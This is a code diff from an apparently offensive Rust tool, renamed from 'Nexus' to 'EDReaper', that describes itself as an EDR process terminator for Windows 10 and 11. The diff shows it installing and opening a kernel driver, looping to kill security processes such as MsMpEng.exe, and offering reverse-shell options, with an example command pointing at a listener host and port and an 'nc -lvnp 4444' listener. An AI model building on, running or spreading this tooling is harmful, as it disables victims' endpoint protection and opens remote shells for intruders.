@@ -113,10 +113,10 @@ fn parse_args() -> Option<Opts> {
 }
 
 fn print_help() {
-    println!("Nexus - MonProcessEX.sys EDR process terminator");
+    println!("EDReaper - MonProcessEX.sys EDR process terminator");
     println!("Cross-version, all Windows 10 and Windows 11 builds.");
     println!();
-    println!("usage: nexus.exe [options]");
+    println!("usage: edreaper.exe [options]");
     println!();
     println!("options:");
     println!("  -s, --silent           suppress all console output");
@@ -142,7 +142,7 @@ fn print_help() {
     println!("  -P, --lport <port>     listener port");
     println!("  -c, --shell-cmd <cmd>  binary to execute (default: cmd.exe)");
     println!();
-    println!("  example:  nexus.exe -n \"MsMpEng.exe\" -H 192.168.1.10 -P 4444 -c cmd.exe");
+    println!("  example:  edreaper.exe -n \"MsMpEng.exe\" -H 192.168.1.10 -P 4444 -c cmd.exe");
     println!("  listener: nc -lvnp 4444");
     println!();
     println!("  -h, --help             show this help");
@@ -158,7 +158,7 @@ fn main() {
     };
 
     if opts.version {
-        println!("Nexus v0.1.0");
+        println!("EDReaper v0.1.0");
         println!("MonProcessEX.sys cross-version EDR process terminator");
         return;
     }
@@ -237,7 +237,7 @@ fn main() {
     let svc_name = opts.service_name.clone().unwrap_or_else(ops::random_service_name);
 
     let mut _drv_svc: Option<loader::DriverService> = None;
-    let dev = match driver::NexusDev::open() {
+    let dev = match driver::EdReaperDev::open() {
         Ok(d) => {
             println!("[+] driver already loaded");
             d
@@ -246,7 +246,7 @@ fn main() {
             let svc = loader::DriverService::install(&svc_name, &drv_file)
                 .unwrap_or_else(|e| { println!("fatal: {e}"); flush_and_exit(EXIT_DRIVER_FAIL); });
             svc.start().unwrap_or_else(|e| { println!("fatal: {e}"); flush_and_exit(EXIT_DRIVER_FAIL); });
-            let d = driver::NexusDev::open().unwrap_or_else(|e| { println!("fatal: {e}"); flush_and_exit(EXIT_DRIVER_FAIL); });
+            let d = driver::EdReaperDev::open().unwrap_or_else(|e| { println!("fatal: {e}"); flush_and_exit(EXIT_DRIVER_FAIL); });
             println!("[+] driver loaded");
             _drv_svc = Some(svc);
             d
@@ -291,7 +291,7 @@ fn main() {
             let mut pass: u32 = 0;
             while !stop_kill2.load(Ordering::SeqCst) {
                 // Open a fresh handle each pass (driver stays loaded via _drv_svc).
-                if let Ok(dev2) = driver::NexusDev::open() {
+                if let Ok(dev2) = driver::EdReaperDev::open() {
                     let procs = targets::find_running(
                         &names_bg.iter().map(|s| s.as_str()).collect::<Vec<&str>>(),
                     );
